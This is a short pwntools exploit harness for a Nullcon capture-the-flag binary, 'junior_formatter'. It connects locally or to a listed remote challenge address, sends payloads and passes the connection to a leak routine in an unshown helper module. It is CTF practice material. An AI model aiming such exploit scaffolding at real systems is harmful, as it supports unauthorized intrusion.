from pwn import *
import formal_pledge

def start():
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    return process([exe], aslr=False)

def send_payload(payload):
    p = start()
    p.recvuntil(b'>> ')
    p.sendline(payload)
    p.recvline()
    resp = p.recvline()
    return resp, p

# binary from https://ctf.nullcon.net/challenges
exe = './junior_formatter'
elff = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# python exploit.py REMOTE 52.59.124.14 5031
# python exploit.py 
formal_pledge.leak(send_payload, elff)